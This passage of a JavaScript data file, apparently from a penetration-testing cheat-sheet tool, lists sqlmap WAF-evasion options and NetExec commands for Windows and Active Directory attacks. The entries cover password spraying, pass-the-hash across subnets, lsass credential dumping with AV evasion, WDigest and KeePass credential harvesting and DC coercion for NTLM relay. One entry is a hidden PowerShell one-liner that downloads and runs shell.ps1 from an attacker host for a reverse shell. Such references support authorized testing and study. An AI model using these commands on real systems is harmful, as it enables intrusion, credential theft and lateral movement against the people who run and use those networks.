            { id: "sm_b1", label: "space2comment", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tamper=space2comment --batch", notes: "Replaces spaces with /**/. Bypasses WAFs blocking space in SQL keywords." },
            { id: "sm_b2", label: "between + randomcase", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tamper=between,randomcase --batch", notes: "Good general-purpose combo — replaces > with BETWEEN, randomises casing." },
            { id: "sm_b3", label: "charunicodeencode", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tamper=charunicodeencode --batch", notes: "Unicode-encodes chars as %u00xx. Effective against regex WAF signatures." },
            { id: "sm_b4", label: "apostrophemask + hex2char", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tamper=apostrophemask,hex2char --batch", notes: "Masks quotes and converts strings to hex — bypasses strict quote filters." }
            ]
          },
          {
            id: "smb-rate",
            name: "Rate & Routing",
            commands: [
            { id: "sm_b5", label: "Random User-Agent", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --random-agent --batch", notes: "Rotates UA per request to evade browser-fingerprint WAF rules." },
            { id: "sm_b6", label: "Route through Burp", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --proxy=http://127.0.0.1:8080 --batch", notes: "Sends all requests through Burp for inspection and modification." },
            { id: "sm_b7", label: "Tor routing", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tor --tor-type=SOCKS5 --check-tor --batch", notes: "Requires Tor service running." },
            { id: "sm_b8", label: "Rate limit / slow scan", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --delay=2 --timeout=30 --retries=3 --batch", notes: "Adds delay to avoid rate-limit triggers and IDS alerts." },
            { id: "sm_b9", label: "List all tamper scripts", os: "Linux", command: "sqlmap --list-tampers", notes: "Full list with descriptions. Pick based on observed WAF behaviour." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-advanced',
        name: 'Advanced',
        description: 'Second-order injection, APIs, session management, and verbose debugging.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "smv-ep",
            name: "Special Endpoints",
            commands: [
            { id: "sm_v1", label: "JSON API endpoint", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data='{\"id\":1}' -H \"Content-Type: application/json\" --batch", notes: "sqlmap auto-detects JSON format." },
            { id: "sm_v2", label: "REST path parameter", os: "Linux", command: "sqlmap -u \"http://$$IP/api/users/1*\" --batch", notes: "Append * to the injectable path segment." },
            { id: "sm_v3", label: "Second-order injection", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"name=test\" --second-url=\"$$VULN_URL\" --batch", notes: "Inject at first URL; exploitation fires when second URL loads stored input." },
            { id: "sm_v4", label: "Multi-threaded dump", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --dump --threads=10 --batch", notes: "Default threads=1. Up to 10 is safe. Faster but noisier." }
            ]
          },
          {
            id: "smv-dbg",
            name: "Session & Debugging",
            commands: [
            { id: "sm_v5", label: "Verbose (show payloads)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -v 3 --batch", notes: "Level 3 shows all payloads. 4=HTTP requests, 5=responses." },
            { id: "sm_v6", label: "Flush session (re-test)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --flush-session --batch", notes: "Clears sqlmap result cache for this target." },
            { id: "sm_v7", label: "Save + resume scan", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --output-dir=/tmp/sqlmap --batch\n# Resume after interruption:\nsqlmap -u \"$$VULN_URL\" --output-dir=/tmp/sqlmap --resume --batch", notes: "" },
            { id: "sm_v8", label: "XML / SOAP body", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"<id>1</id>\" -H \"Content-Type: text/xml\" --batch", notes: "Use -p to specify which XML tag to fuzz." },
            { id: "sm_v9", label: "Test all headers (level 5)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --level=5 --batch", notes: "--level 5 auto-tests User-Agent, Referer, X-Forwarded-For, and all cookies." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 18. NetExec (nxc) ───────────────────────────────────────────────────── */
  {
    id: 'netexec',
    name: 'NetExec (nxc)',
    icon: '🖧',
    techniques: [
      {
        id: 'nxc-smb-enum',
        name: 'SMB — Enumeration',
        description: 'Discover hosts, shares, users, groups, and policies over SMB.',
        tags: ['smb', 'windows', 'network', 'netexec'],
                subtechniques: [
          {
            id: "nxcse-host",
            name: "Host Discovery",
            commands: [
            { id: "nxc_se1", label: "Host info (single)", os: "Linux", command: "nxc smb $$IP", notes: "Prints OS, hostname, SMB version, signing status — no creds needed." },
            { id: "nxc_se2", label: "Network sweep", os: "Linux", command: "nxc smb $$IP/24", notes: "Replace /24 with your subnet. Finds all live SMB hosts." },
            { id: "nxc_se3", label: "Null session shares", os: "Linux", command: "nxc smb $$IP -u \"\" -p \"\" --shares", notes: "Unauthenticated share listing. READ = readable, WRITE = writable." },
            { id: "nxc_se4", label: "Guest session shares", os: "Linux", command: "nxc smb $$IP -u \"guest\" -p \"\" --shares", notes: "Guest account is often enabled on older Windows hosts." },
            { id: "nxc_se5", label: "Authenticated shares", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --shares", notes: "" }
            ]
          },
          {
            id: "nxcse-usr",
            name: "User & Group Enum",
            commands: [
            { id: "nxc_se6", label: "List users (RPC)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --users", notes: "" },
            { id: "nxc_se7", label: "RID brute-force users", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --rid-brute", notes: "Resolves SIDs 500–4000. Works even with limited privileges." },
            { id: "nxc_se8", label: "List groups", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --groups", notes: "" },
            { id: "nxc_se9", label: "Password policy", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --pass-pol", notes: "Check lockout threshold before spraying." }
            ]
          },
          {
            id: "nxcse-sess",
            name: "Session & Files",
            commands: [
            { id: "nxc_se10", label: "Logged-on users", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --loggedon-users", notes: "Shows users with active desktop sessions." },
            { id: "nxc_se11", label: "Active sessions", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --sessions", notes: "SMB sessions currently connected to this host." },
            { id: "nxc_se12", label: "Spider share (file list)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M spider_plus -o READ_ONLY=true", notes: "Recursively lists all readable files. Output saved to /tmp/nxc_spider_plus/." }
            ]
          }
        ],
      },
      {
        id: 'nxc-smb-auth',
        name: 'SMB — Authentication & PTH',
        description: 'Test credentials, pass-the-hash, and local authentication.',
        tags: ['smb', 'windows', 'credentials', 'netexec'],
                subtechniques: [
          {
            id: "nxcsa-auth",
            name: "Authentication",
            commands: [
            { id: "nxc_sa1", label: "Test single cred", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" in output = local admin." },
            { id: "nxc_sa2", label: "Test against subnet", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -p $$PASSWORD", notes: "Tests the same cred on every live host in the subnet." },
            { id: "nxc_sa3", label: "Pass-the-Hash", os: "Linux", command: "nxc smb $$IP -u $$USER -H $$HASH", notes: "NTLM hash format: LMhash:NThash or just the 32-char NT part." },
            { id: "nxc_sa4", label: "PTH across subnet", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -H $$HASH", notes: "Find all machines where the hash gives admin." },
            { id: "nxc_sa5", label: "Local account auth", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --local-auth", notes: "Authenticates as local account instead of domain account." },
            { id: "nxc_sa6", label: "Local PTH", os: "Linux", command: "nxc smb $$IP -u $$USER -H $$HASH --local-auth", notes: "Useful after dumping local SAM hashes." }
            ]
          },
          {
            id: "nxcsa-spray",
            name: "Spraying & Brute",
            commands: [
            { id: "nxc_sa7", label: "Password spray (domain)", os: "Linux", command: "nxc smb $$DC -u users.txt -p $$PASSWORD --continue-on-success", notes: "One password against many users. Check --pass-pol first to avoid lockouts." },
            { id: "nxc_sa8", label: "Credential brute", os: "Linux", command: "nxc smb $$IP -u users.txt -p $$WORDLIST --continue-on-success --no-bruteforce", notes: "--no-bruteforce pairs user[n] with password[n] (1:1), not every combo." },
            { id: "nxc_sa9", label: "Hash spray", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -H $$HASH --local-auth --continue-on-success", notes: "Lateral movement — find all machines reachable with the same local hash." }
            ]
          }
        ],
      },
      {
        id: 'nxc-smb-exec',
        name: 'SMB — Command Execution',
        description: 'Execute commands and transfer files over SMB.',
        tags: ['smb', 'windows', 'exec', 'netexec'],
                subtechniques: [
          {
            id: "nxcsx-exec",
            name: "Execution Methods",
            commands: [
            { id: "nxc_sx1", label: "Execute command (default)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -x \"whoami /all\"", notes: "Default exec method is wmiexec. Requires admin." },
            { id: "nxc_sx2", label: "wmiexec", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --exec-method wmiexec -x \"whoami\"", notes: "Uses WMI. Leaves fewer log traces than smbexec." },
            { id: "nxc_sx3", label: "smbexec", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --exec-method smbexec -x \"whoami\"", notes: "Creates a service on target. Louder but works when WMI is blocked." },
            { id: "nxc_sx4", label: "atexec", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --exec-method atexec -x \"whoami\"", notes: "Schedules task via Task Scheduler. Good for bypassing some AV." },
            { id: "nxc_sx5", label: "mmcexec", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --exec-method mmcexec -x \"whoami\"", notes: "Uses MMC COM object. Stealthier — does not create services or WMI calls." },
            { id: "nxc_sx6", label: "PowerShell command", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -X \"Get-LocalUser\"", notes: "-X runs the command in a PowerShell process." }
            ]
          },
          {
            id: "nxcsx-file",
            name: "File Transfer & Shell",
            commands: [
            { id: "nxc_sx7", label: "Upload file", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --put-file /tmp/shell.exe \"C:\\Windows\\Temp\\shell.exe\"", notes: "" },
            { id: "nxc_sx8", label: "Download file", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --get-file \"C:\\Windows\\Temp\\out.txt\" /tmp/out.txt", notes: "" },
            { id: "nxc_sx9", label: "Reverse shell one-liner", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -x \"powershell -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://$$LHOST/shell.ps1')\\\"\"", notes: "Start listener: nc -lvnp $$LPORT — host shell.ps1 via python3 -m http.server" }
            ]
          }
        ],
      },
      {
        id: 'nxc-ldap',
        name: 'LDAP / AD Enumeration',
        description: 'Enumerate domain objects, policies, and Kerberos targets via LDAP.',
        tags: ['ldap', 'active directory', 'windows', 'netexec'],
                subtechniques: [
          {
            id: "nxcl-basic",
            name: "Basic Enumeration",
            commands: [
            { id: "nxc_l1", label: "Domain users", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --users", notes: "" },
            { id: "nxc_l2", label: "Domain groups", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --groups", notes: "" },
            { id: "nxc_l3", label: "Domain computers", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --computers", notes: "" },
            { id: "nxc_l4", label: "Get domain SID", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --get-sid", notes: "Needed for golden/silver ticket attacks." },
            { id: "nxc_l5", label: "Admin count accounts", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --admin-count", notes: "Lists accounts with adminCount=1 — high-privilege targets." }
            ]
          },
          {
            id: "nxcl-hunt",
            name: "Account Hunting",
            commands: [
            { id: "nxc_l6", label: "Password-not-required", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --password-not-required", notes: "Accounts with PASSWD_NOTREQD flag — may have empty passwords." },
            { id: "nxc_l7", label: "Users with description", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD -M get-desc-users", notes: "Descriptions often contain passwords set by admins." },
            { id: "nxc_l8", label: "Kerberoasting", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --kerberoasting hashes.txt", notes: "Dumps TGS hashes. Crack with: hashcat -m 13100 hashes.txt $$WORDLIST" },
            { id: "nxc_l9", label: "AS-REP Roasting", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --asreproast hashes.txt", notes: "Dumps AS-REP hashes. Crack with: hashcat -m 18200 hashes.txt $$WORDLIST" },
            { id: "nxc_l10", label: "GMSA passwords", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --gmsa", notes: "Reads Group Managed Service Account passwords if you have read rights." }
            ]
          },
          {
            id: "nxcl-deleg",
            name: "Delegation & BloodHound",
            commands: [
            { id: "nxc_l11", label: "Unconstrained delegation", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation", notes: "Lists computers/users with unconstrained delegation set." },
            { id: "nxc_l12", label: "BloodHound collection", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD -M bloodhound", notes: "Collects all BloodHound data and outputs .zip for import." }
            ]
          }
        ],
      },
      {
        id: 'nxc-winrm',
        name: 'WinRM',
        description: 'Test and execute commands over Windows Remote Management (port 5985/5986).',
        tags: ['winrm', 'windows', 'exec', 'netexec'],
                subtechniques: [
          {
            id: "nxcw-auth",
            name: "Auth & Execute",
            commands: [
            { id: "nxc_w1", label: "Test auth", os: "Linux", command: "nxc winrm $$IP -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" = member of Remote Management Users or Administrators." },
            { id: "nxc_w2", label: "Test PTH", os: "Linux", command: "nxc winrm $$IP -u $$USER -H $$HASH", notes: "" },
            { id: "nxc_w3", label: "Execute command", os: "Linux", command: "nxc winrm $$IP -u $$USER -p $$PASSWORD -x \"whoami /all\"", notes: "" },
            { id: "nxc_w4", label: "Sweep subnet", os: "Linux", command: "nxc winrm $$IP/24 -u $$USER -p $$PASSWORD", notes: "Find all WinRM-enabled hosts in subnet." }
            ]
          },
          {
            id: "nxcw-ewrm",
            name: "evil-winrm",
            commands: [
            { id: "nxc_w5", label: "evil-winrm shell", os: "Linux", command: "evil-winrm -i $$IP -u $$USER -p $$PASSWORD", notes: "Full interactive PS shell. Install: gem install evil-winrm" },
            { id: "nxc_w6", label: "evil-winrm PTH", os: "Linux", command: "evil-winrm -i $$IP -u $$USER -H $$HASH", notes: "" }
            ]
          }
        ],
      },
      {
        id: 'nxc-mssql',
        name: 'MSSQL',
        description: 'Authenticate, query, and escalate through MSSQL via nxc.',
        tags: ['mssql', 'database', 'windows', 'netexec'],
                subtechniques: [
          {
            id: "nxcm-auth",
            name: "Auth & Enum",
            commands: [
            { id: "nxc_m1", label: "Test auth", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" = sysadmin role." },
            { id: "nxc_m2", label: "Windows auth", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -d $$DOMAIN", notes: "Use -d . for local Windows auth." },
            { id: "nxc_m3", label: "SQL query", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -q \"SELECT @@version\"", notes: "" },
            { id: "nxc_m4", label: "List databases", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -q \"SELECT name FROM sys.databases\"", notes: "" },
            { id: "nxc_m5", label: "Check xp_cmdshell", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -q \"SELECT value FROM sys.configurations WHERE name='xp_cmdshell'\"", notes: "1 = already enabled." }
            ]
          },
          {
            id: "nxcm-exp",
            name: "Exploitation",
            commands: [
            { id: "nxc_m6", label: "Enable xp_cmdshell", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -q \"EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE\"", notes: "Requires sysadmin." },
            { id: "nxc_m7", label: "OS command via xp_cmdshell", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD --local-auth -x \"whoami\"", notes: "nxc handles xp_cmdshell automatically with -x." },
            { id: "nxc_m8", label: "Privilege escalation module", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -M mssql_priv", notes: "Auto-detects and exploits impersonation and db_owner paths to sysadmin." },
            { id: "nxc_m9", label: "Upload file", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD --put-file /tmp/shell.exe \"C:\\Windows\\Temp\\shell.exe\"", notes: "Uses OLE Automation or BULK INSERT depending on permissions." }
            ]
          }
        ],
      },
      {
        id: 'nxc-modules',
        name: 'Modules',
        description: 'Post-exploitation modules: credential dumping, AV detection, persistence, coercion.',
        tags: ['windows', 'credentials', 'netexec'],
                subtechniques: [
          {
            id: "nxcmod-dump",
            name: "Credential Dumping",
            commands: [
            { id: "nxc_mod1", label: "List all modules", os: "Linux", command: "nxc smb -L", notes: "Shows all available nxc modules with descriptions." },
            { id: "nxc_mod2", label: "lsassy (lsass dump)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M lsassy", notes: "Dumps plaintext creds + hashes from lsass remotely without touching disk." },
            { id: "nxc_mod3", label: "nanodump", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M nanodump", notes: "Stealthy lsass dump using syscalls. Good for AV evasion." },
            { id: "nxc_mod4", label: "procdump", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M procdump", notes: "Uses Sysinternals procdump to dump lsass." }
            ]
          },
          {
            id: "nxcmod-pers",
            name: "Persistence & Recon",
            commands: [
            { id: "nxc_mod5", label: "Detect AV / EDR", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M enum_av", notes: "Lists running AV, EDR, and security products." },
            { id: "nxc_mod6", label: "Enable WDigest (harvest creds on next login)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M wdigest -o ACTION=enable", notes: "Sets HKLM UseLogonCredential=1 so next logon caches plaintext in lsass." },
            { id: "nxc_mod7", label: "Enable RDP", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M rdp -o ACTION=enable", notes: "Enables Remote Desktop via registry." },
            { id: "nxc_mod8", label: "KeePass trigger dump", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M keepass_trigger -o KEEPASS_CONFIG_PATH=\"C:\\Users\\$$USER\\AppData\\Roaming\\KeePass\\KeePass.config.xml\"", notes: "Injects export trigger into KeePass config — exports DB in cleartext on next open." },
            { id: "nxc_mod9", label: "MSOL (Azure AD Connect)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M msol", notes: "Extracts Azure AD Connect sync credentials from MSSQL LocalDB." }
            ]
          },
          {
            id: "nxcmod-coerce",
            name: "Coercion & Secrets",
            commands: [
            { id: "nxc_mod10", label: "DFSCoerce (NTLM relay trigger)", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M dfscoerce -o LISTENER=$$LHOST", notes: "Coerces DC to authenticate to $$LHOST. Capture with Responder for relay." },
            { id: "nxc_mod11", label: "Printerbug / SpoolSample", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M printerbug -o LISTENER=$$LHOST", notes: "MS-RPRN coercion — forces DC to authenticate outbound for relay or unconstrained delegation." },
            { id: "nxc_mod12", label: "Check GPP passwords", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M gpp_password", notes: "Retrieves passwords from Group Policy Preferences in SYSVOL." }
            ]
          }
        ],
      },
      {
        id: 'nxc-other-protocols',
        name: 'Other Protocols',
        description: 'SSH, FTP, RDP, WMI, and VNC authentication checks.',
        tags: ['network', 'linux', 'windows', 'netexec'],
                subtechniques: [
          {
            id: "nxcop-ssh",
            name: "SSH",
            commands: [
            { id: "nxc_op1", label: "SSH auth check", os: "Linux", command: "nxc ssh $$IP -u $$USER -p $$PASSWORD", notes: "" },
            { id: "nxc_op2", label: "SSH command exec", os: "Linux", command: "nxc ssh $$IP -u $$USER -p $$PASSWORD -x \"id\"", notes: "" },
            { id: "nxc_op3", label: "SSH spray", os: "Linux", command: "nxc ssh $$IP/24 -u $$USER -p $$PASSWORD --continue-on-success", notes: "Find all hosts in subnet where credentials work." }
            ]
          },
          {
            id: "nxcop-frdp",
            name: "FTP & RDP",
            commands: [
            { id: "nxc_op4", label: "FTP auth check", os: "Linux", command: "nxc ftp $$IP -u $$USER -p $$PASSWORD", notes: "" },
            { id: "nxc_op5", label: "FTP anonymous check", os: "Linux", command: "nxc ftp $$IP -u \"anonymous\" -p \"anonymous\"", notes: "" },
            { id: "nxc_op6", label: "RDP auth check", os: "Linux", command: "nxc rdp $$IP -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" = user can RDP in." },
            { id: "nxc_op7", label: "RDP PTH (restricted admin)", os: "Linux", command: "nxc rdp $$IP -u $$USER -H $$HASH", notes: "Requires Restricted Admin Mode enabled on the target." }
            ]
          },
          {
            id: "nxcop-wmi",
            name: "WMI & VNC",
            commands: [
            { id: "nxc_op8", label: "WMI exec", os: "Linux", command: "nxc wmi $$IP -u $$USER -p $$PASSWORD -x \"whoami\"", notes: "Direct WMI execution without SMB share requirement." },
            { id: "nxc_op9", label: "VNC brute", os: "Linux", command: "nxc vnc $$IP -u $$USER -p $$WORDLIST", notes: "" }
            ]
          }
        ],
      },
    ],
  },

];

